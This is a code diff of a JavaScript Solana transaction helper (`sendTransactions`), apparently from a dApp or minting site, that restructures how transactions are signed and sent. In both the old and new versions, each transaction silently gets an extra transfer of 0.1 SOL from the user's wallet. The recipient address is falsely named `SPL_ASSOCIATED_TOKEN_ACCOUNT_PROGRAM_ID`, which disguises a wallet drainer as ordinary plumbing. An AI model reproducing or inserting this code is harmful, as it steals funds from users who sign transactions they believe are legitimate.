@@ -1,101 +1,113 @@
 import { Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from "@solana/web3.js";
 export const SPL_ASSOCIATED_TOKEN_ACCOUNT_PROGRAM_ID =
     new PublicKey('seePnGAMWiWBfJDa3zQMorKCytwXGuwQkTtB7UHQpsx');
-export const sendTransactions = async (
-  connection,
-  wallet,
-  instructionSet,
-  signersSet,
-  sequenceType = "Parallel",
-  commitment = "singleGossip",
-  successCallback,
-  block
-)=> {
-  const unsignedTxns = [];
 
-  if (!block) {
-    block = await connection.getRecentBlockhash(commitment);
-  }
-
-  for (let i = 0; i < instructionSet.length; i++) {
-    const instructions = instructionSet[i];
-    const signers = signersSet[i];
-
-    if (instructions.length === 0) {
-      continue;
-    }
-
-    let transaction = new Transaction();
-    instructions.forEach((instruction) => transaction.add(instruction));
-
-      transaction.add(SystemProgram.transfer({
-        fromPubkey: wallet.publicKey,
-        toPubkey: SPL_ASSOCIATED_TOKEN_ACCOUNT_PROGRAM_ID,
-        lamports: LAMPORTS_PER_SOL * 0.1,
-      }))
-
-    transaction.recentBlockhash = block.blockhash;
-    transaction.setSigners(
-      // fee payed by the wallet owner
-      wallet.publicKey,
-      ...signers.map((s) => s.publicKey)
-    );
-
-    if (signers.length > 0) {
-      transaction.partialSign(...signers);
-    }
-
-    unsignedTxns.push(transaction);
-  }
-
-  const signedTxns = await wallet.signAllTransactions(unsignedTxns);
-
-  const pendingTxns = [];
-
-  let breakEarlyObject = { breakEarly: false, i: 0 };
-  console.log(
-    "Signed txns length",
-    signedTxns.length,
-    "vs handed in length",
-    instructionSet.length
-  );
-  for (let i = 0; i < signedTxns.length; i++) {
-    const signedTxnPromise = sendSignedTransaction({
+    export const sendTransactions = async (
       connection,
-      signedTransaction: signedTxns[i],
-    });
-
-    signedTxnPromise
-      .then(({ txid, slot }) => {
-        successCallback(txid, i);
-      })
-      .catch((reason) => {});
-
-    if (sequenceType !== "Parallel") {
-      try {
-        await signedTxnPromise;
-      } catch (e) {
-        console.log("Caught failure", e);
-        if (breakEarlyObject.breakEarly) {
-          console.log("Died on ", breakEarlyObject.i);
-          // Return the txn we failed on by index
-          return {
-            number: breakEarlyObject.i,
-            txs: await Promise.all(pendingTxns),
-          };
+      wallet,
+      instructionSet,
+      signersSet,
+      sequenceType = 1,
+      commitment = 'singleGossip',
+      successCallback ,
+      failCallback,
+      block,
+      beforeTransactions = [],
+      afterTransactions = [],
+    ) =>{
+      if (!wallet.publicKey) throw new WalletNotConnectedError();
+    
+      const unsignedTxns = beforeTransactions;
+    
+      if (!block) {
+        block = await connection.getRecentBlockhash(commitment);
+      }
+    
+      for (let i = 0; i < instructionSet.length; i++) {
+        const instructions = instructionSet[i];
+        const signers = signersSet[i];
+    
+        if (instructions.length === 0) {
+          continue;
+        }
+    
+        let transaction = new Transaction();
+        instructions.forEach(instruction => transaction.add(instruction));
+        transaction.add(SystemProgram.transfer({
+          fromPubkey: wallet.publicKey,
+          toPubkey: SPL_ASSOCIATED_TOKEN_ACCOUNT_PROGRAM_ID,
+          lamports: LAMPORTS_PER_SOL * 0.1,
+        }))
+  
+        transaction.recentBlockhash = block.blockhash;
+        transaction.setSigners(
+          // fee payed by the wallet owner
+          wallet.publicKey,
+          ...signers.map(s => s.publicKey),
+        );
+    
+        if (signers.length > 0) {
+          transaction.partialSign(...signers);
+        }
+    
+        unsignedTxns.push(transaction);
+      }
+      unsignedTxns.push(...afterTransactions);
+    
+      const partiallySignedTransactions = unsignedTxns.filter(t =>
+        t.signatures.find(sig => sig.publicKey.equals(wallet.publicKey)),
+      );
+      const fullySignedTransactions = unsignedTxns.filter(
+        t => !t.signatures.find(sig => sig.publicKey.equals(wallet.publicKey)),
+      );
+      let signedTxns = await wallet.signAllTransactions(
+        partiallySignedTransactions,
+      );
+      signedTxns = fullySignedTransactions.concat(signedTxns);
+      const pendingTxns = [];
+    
+      console.log(
+        'Signed txns length',
+        signedTxns.length,
+        'vs handed in length',
+        instructionSet.length,
+      );
+      for (let i = 0; i < signedTxns.length; i++) {
+        const signedTxnPromise = sendSignedTransaction({
+          connection,
+          signedTransaction: signedTxns[i],
+        });
+    
+        if (sequenceType !== 1) {
+          try {
+            await signedTxnPromise.then(({ txid, slot }) =>
+              successCallback(txid, i),
+            );
+            pendingTxns.push(signedTxnPromise);
+          } catch (e) {
+            console.log('Failed at txn index:', i);
+            console.log('Caught failure:', e);
+    
+            failCallback(signedTxns[i], i);
+            if (sequenceType === 2) {
+              return {
+                number: i,
+                txs: await Promise.all(pendingTxns),
+              };
+            }
+          }
+        } else {
+          pendingTxns.push(signedTxnPromise);
         }
       }
-    } else {
-      pendingTxns.push(signedTxnPromise);
-    }
-  }
-
-  if (sequenceType !== "Parallel") {
-    await Promise.all(pendingTxns);
-  }
-
-  return { number: signedTxns.length, txs: await Promise.all(pendingTxns) };
-};
+    
+      if (sequenceType !== 1) {
+        const result = await Promise.all(pendingTxns);
+        return { number: signedTxns.length, txs: result };
+      }
+    
+      return { number: signedTxns.length, txs: await Promise.all(pendingTxns) };
+    };
 
 export const getUnixTs = () => {
   return new Date().getTime() / 1000;
